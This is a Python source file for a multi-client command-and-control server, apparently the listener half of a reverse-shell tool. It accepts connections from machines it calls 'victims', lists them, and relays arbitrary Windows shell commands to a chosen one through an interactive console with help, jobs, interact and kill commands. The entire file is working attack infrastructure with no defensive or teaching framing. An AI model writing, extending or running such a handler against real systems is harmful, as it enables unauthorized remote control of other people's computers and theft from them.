import socket
import threading
import json
import sys

class Server():

    def __init__(self, ip:str, port:int):
        self.ip = ip
        self.port = port
        self.is_server_on = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.victims_dict = {} # Stores conn of the victim(s)
        self.victim_count = 0

    def _send(self, conn:socket.socket, data:str):
        """Sends data as json to conn."""

        conn.sendall(json.dumps(data).encode())

    def _receive(self, conn:socket.socket):
        """Return data received form the conn."""
        json_data = ""

        while True:
            try:
                chunk = conn.recv(1024)

                if not chunk:
                    return None
                
                json_data += chunk.decode('utf-8')
                return json.loads(json_data)
            
            except ValueError:
                continue
            except (ConnectionResetError, OSError):
                # Socket was closed/reset.
                return None

    def _accept_connection(self) -> None:
        """Adds conn, addr to connected_client dict."""

        while self.is_server_on:

            try:
                conn, addr = self.sock.accept()
                self.victim_count += 1
                print(f"Got connection from {addr}")

                self.victims_dict.update({self.victim_count: conn})

            except Exception as e:
                print(e)
                

    def _close_connection(self, victim_id:int) -> None:

        if not self._victim_exists(victim_id):
            print(f"[!] No client associated with that ID, {victim_id}.")
            return
        
        conn:socket.socket = self.victims_dict.get(victim_id)

        try:
            print(f"[+] Clossing connection with {conn}")
            conn.close()
            self.victims_dict.pop(victim_id)
            self.victim_count -= 1

        except Exception as e:
            print(f"[!] Error occured: {e}")
            return
        
    def _console_help(self):
        commands = {
            "help\t": "Print this help menu.",
            "exit\t": "Exit the program",
            "kill\t": "Kill a connection from ID.",
            "jobs\t": "To see connected victims.",
            "interact": "Interact with one of the victim."
        }

        print("[+] Help menu.")
        print("Command\t\tDescription")

        for cmd in commands:
            print(f"{cmd}\t{commands.get(cmd)}")

    def _victim_help(self):
        commands = {
            "help\t": "Print this help menu.",
            "back\t": "Return to the console(background to current connection).",
            "    \t": "All defualt windows command."
        }

        for cmd in commands:
            print(f"{cmd}\t{commands.get(cmd)}")

    def _victim_exists(self, id:int) -> bool:
        """Takes victim id to check if it exists or not. Returns True if victim exists, else False."""

        if id not in self.victims_dict.keys():
            return False

        return True

    def _list_victims(self):
        print(f"[+] Total {self.victim_count} victims...")
        print("ID\tVictim")

        for id in self.victims_dict:
            print(f"{id}\t{self.victims_dict.get(id)}")

    def _interact_victim(self, victim_id) -> None:

        if not self._victim_exists(victim_id):
            print(f"[!] Victim with ID, {victim_id} does not exists.")
            return

        conn:socket.socket = self.victims_dict.get(victim_id)

        while conn:
    
            data = input(f"{victim_id}-> ").strip(' ')

            if "help" == data:
                self._victim_help()

            elif "back" == data:
                break

            else:
                self._send(conn, data)
    
                receive_data = self._receive(conn)
        
                if not receive_data:
                    continue

                else:
                    print(receive_data)
        
    def console(self):

        while self.is_server_on:
            try:

                cmd = input("--> ").lower().strip(' ')

                if cmd == "help":
                    self._console_help()

                elif cmd == "exit":
                    self.is_server_on = False

                # Close a specific connection
                elif cmd.startswith("kill"):
                    self._close_connection(int(cmd[4:].strip(' ')))

                elif cmd == "jobs":
                    self._list_victims()

                elif cmd[:8] == "interact":
                    self._interact_victim(int(cmd[8:]))

                else:
                    print("[-] Please enter a valid command")


            except KeyboardInterrupt:
                print("[+] type 'exit' to exit.")

            except Exception as e:
                print(e)

    def start_server(self):

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.ip, self.port))
        self.sock.listen(0)
        print(f"[+] Server listening on {self.ip}:{self.port}...")

    def main(self):
        
        print("[+] Starting server...")

        try:
            self.start_server()
            self.is_server_on = True
        except Exception as e:
            print(f"[!] {e}")
            sys.exit(1)

        if not self.is_server_on:
            print("[!] Failed to start the server...")

        try:
            print("[+] Waiting for victim to connect...")
            a_t = threading.Thread(target=self._accept_connection, daemon=True)
            a_t.start()
        except Exception as e:
            print(f"[!] {e}")

        try:
            print("[+] Type 'help' for menu.")
            c_t = threading.Thread(target=self.console)
            c_t.start()
        except Exception as e:
            print(f"[!] {e}")


if __name__ == "__main__":
    server = Server("127.0.0.1", 4444)
    server.main()